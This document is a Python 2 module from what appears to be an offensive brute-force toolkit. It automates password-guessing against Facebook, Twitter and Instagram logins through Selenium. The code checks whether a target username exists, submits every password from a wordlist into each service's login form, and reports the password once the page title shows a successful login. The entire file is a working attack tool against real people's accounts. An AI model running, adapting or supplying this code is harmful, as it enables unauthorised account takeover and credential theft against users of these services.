 # -*- coding: utf-8 -*-

'''
web.py - Core module for web-based services bruteforce.

Category: Core
Description:
    This module provides the methods for bruteforcing web-based services.
    Most of these are built upon the Selenium library for webscraping and manipulation.
    These include:
    - facebook
    - instagram
    - twitter

    These are some of the more common web services that have presented vulnerabilities in
    their authentication in the past. NOTE that rate-limiting may be present within their
    respective login forms, so timeouts delays are reinforced.

Dependencies: selenium

Version: v1.0.0
Author: ex0dus
License: GPL-3.0 || https://opensource.org/licenses/GPL-3.0

'''

from consts import *

from xmpp import Client
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

# Assert: If specified string is NOT found, that means that user has succcessfully logged in.
# The specified string usually means that the search query is erroneous, meaning that no
# page for the specified user exists.

class WebBruteforce(object):
    def __init__(self, service, username, wordlist, delay):
        self.service = service
        self.username = username
        self.wordlist = wordlist
        self.delay = delay

    def execute(self):
        print P + "[*] Checking if username exists..." + W
        if self.usercheck(self.username, self.service) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        print "Using %s seconds of delay. Default is 1 second" % self.delay
        self.webBruteforce(self.username, self.wordlist, self.service, self.delay)

    def usercheck(self, username, service):
        driver = webdriver.Firefox()
        try:
            if service == "facebook":
                driver.get("https://www.facebook.com/" + username)
                assert (("Sorry, this page isn't available.") not in driver.page_source)
                driver.close()
            elif service == "twitter":
                driver.get("https://www.twitter.com/" + username)
                assert (("Sorry, that page doesn’t exist!") not in driver.page_source)
                driver.close()
            elif service == "instagram":
                driver.get("https://instagram.com/" + username)
                assert (("Sorry, this page isn't available.") not in driver.page_source)
                driver.close()
        except AssertionError:
            return 1


    def webBruteforce(self, username, wordlist, service, delay):
        driver = webdriver.Firefox()
        if service == "facebook":
            driver.get("https://touch.facebook.com/login?soft=auth/")
        elif service == "twitter":
            driver.get("https://mobile.twitter.com/session/new")
        elif service == "instagram":
            driver.get("https://www.instagram.com/accounts/login/")


        wordlist = open(wordlist, 'r')
        for i in wordlist.readlines():
            password = i.strip("\n")
            try:
                sleep(2) # wait for all elements to load

                # Find username element dependent on service
                if service == "facebook":
                    elem = driver.find_element_by_name("email")
                elif service == "twitter":
                    elem = driver.find_element_by_name("session[username_or_email]")
                elif service == "instagram":
                    elem = driver.find_element_by_name("username")
                elem.clear()
                elem.send_keys(username)

                # Find password element dependent on service
                if service == "facebook":
                    try:
                        elem = driver.find_element_by_name("pass")
                    except NoSuchElementException:
                        elem.send_keys(Keys.RETURN)
                        elem = driver.find_element_by_name("pass")
                elif service == "twitter":
                    elem = driver.find_element_by_name("session[password]")
                elif service == "instagram":
                    elem = driver.find_element_by_name("password")
                elem.clear()
                elem.send_keys(password)
                elem.send_keys(Keys.RETURN)

                sleep(delay) # need to wait for page to load, sleep for delay seconds.

                # Check for changes in driver.title
                if service == "facebook":
                    assert (("Log into Facebook | Facebook") in driver.title)
                elif service == "twitter":
                    assert (("Twitter") in driver.title)
                elif service == "instagram":
                    assert (("Instagram") in driver.title)

                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                sleep(delay)

            except AssertionError:
                # AssertionError: successful login, since we do not see the string in the title, meaning
                # that the page has changed.
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                exit(0)
            except Exception as e:
                print R + ("Error caught! %s" % e) + W
                exit(1)
